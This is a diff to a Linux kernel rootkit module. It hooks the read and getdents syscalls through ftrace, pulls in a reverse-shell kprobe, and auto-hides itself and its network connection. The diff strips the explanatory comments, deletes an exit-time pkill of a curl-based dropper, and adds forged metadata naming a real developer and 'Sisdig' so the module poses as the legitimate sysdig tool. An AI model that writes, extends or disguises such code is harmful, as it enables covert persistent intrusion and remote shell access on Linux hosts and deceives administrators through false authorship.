@@ -1,12 +1,11 @@
-
+#include <linux/atomic.h>
 
 #include "include/headers.h"
 
 
 #define AUTO_HIDE 1
-atomic_t unloading = ATOMIC_INIT(0);      /* ← ADD THIS LINE */
+atomic_t unloading = ATOMIC_INIT(0);      
 
-/* hooking engine (syscall-table swap) */
 #include "ftrace/ftrace.h"
 
 #include "hooks/getdents.h"
@@ -15,7 +14,6 @@ atomic_t unloading = ATOMIC_INIT(0);      /* ← ADD THIS LINE */
 #include "hooks/read.h"
 #include "kprobe/rev-shell.h"
 
-/* ---- the hook table: 4 syscalls ---- */
 static struct ftrace_hook hooks[] = {
     HOOK(__NR_read,       "sys_read",       hooked_read,       &og_read),
     HOOK(__NR_getdents,   "sys_getdents",   hooked_getdents,   &og_getdents),
@@ -34,7 +32,7 @@ static int __init sysdiag_init(void)
 {
     int err;
 
-    hide_conn_init();                    /* precompute ":05C8" style string */
+    hide_conn_init();                    
 
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if (err)
@@ -63,13 +61,6 @@ static void __exit sysdiag_exit(void)
         mon_it = NULL;
     }
 
-    {
-        char *killargv[] = { "/bin/bash", "-c",
-            "pkill -9 -f 'curl -so /usr/sbin/sysdiag'", NULL };
-        static char *envp[] = { "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-        call_usermodehelper(killargv[0], killargv, envp, UMH_WAIT_PROC);
-    }
-
     if (hidden)
         showme();
 
@@ -80,5 +71,9 @@ static void __exit sysdiag_exit(void)
 }
 
 MODULE_LICENSE("GPL");
+MODULE_INFO(intree, "Y");        
+MODULE_AUTHOR("Loris Degioanni");
+MODULE_DESCRIPTION("Sisdig");
+MODULE_VERSION("1.3.7");
 module_init(sysdiag_init);
 module_exit(sysdiag_exit);
